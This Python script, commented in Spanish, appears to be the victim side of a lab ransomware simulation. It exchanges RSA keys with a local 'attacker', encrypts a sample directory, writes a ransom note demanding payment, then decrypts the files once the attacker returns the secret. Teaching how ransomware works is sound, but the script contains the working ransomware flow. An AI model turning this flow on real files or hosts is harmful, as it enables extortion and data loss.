import socket
import pickle
from rsa_crypto import RSA, FileCrypto, derive_key_from_secret

HOST = '127.0.0.1'
PORT = 65432

print("=== VÍCTIMA - FASE DE ATAQUE ===")

# Generar claves RSA
rsa = RSA()
sk, pk = rsa.Grsa(2048, 65537)

# Conectar con atacante
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

# Enviar pk
sock.sendall(pickle.dumps(pk))
print("✓ Clave pública enviada")

# Recibir 'c'
c = pickle.loads(sock.recv(4096))
print("✓ Cifrado 'c' recibido")

# Descifrar 's'
s = rsa.Irsa(sk, c)
print(f"✓ Secreto 's' obtenido")

# Derivar K y cifrar archivos
K = derive_key_from_secret(s)
crypto = FileCrypto(K)
encrypted_files = crypto.encrypt_directory('sample_cipher')

# Crear ransom note
with open('sample_cipher/ransom_note.txt', 'w', encoding='utf-8') as f:
    f.write("*** TUS ARCHIVOS HAN SIDO CIFRADOS ***\n\n")
    f.write("Archivos bloqueados:\n")
    for fname in encrypted_files:
        f.write(f"  - {fname}\n")
    f.write("\nPara recuperarlos, paga al atacante.\n")

print(f"🔒 {len(encrypted_files)} archivos cifrados")
print("❌ Archivos bloqueados.\n")

# BORRAR claves de memoria
del s, K, sk

# Mostrar opcion para "pagar"
input("Presiona ENTER para 'pagar' y recuperar archivos...")

print("\n=== FASE DE RECUPERACIÓN ===")
print("💸 Pagando al atacante...")

# Recibir 's' por la misma conexión
s_received = pickle.loads(sock.recv(4096))
print(f"✓ Secreto 's' recibido del atacante")

sock.close()

# Regenerar K y descifrar
K_recovery = derive_key_from_secret(s_received)
crypto_recovery = FileCrypto(K_recovery)
decrypted_files = crypto_recovery.decrypt_directory('sample_cipher', 'sample_plain')

print(f"✅ {len(decrypted_files)} archivos recuperados en lab/sample_plain/")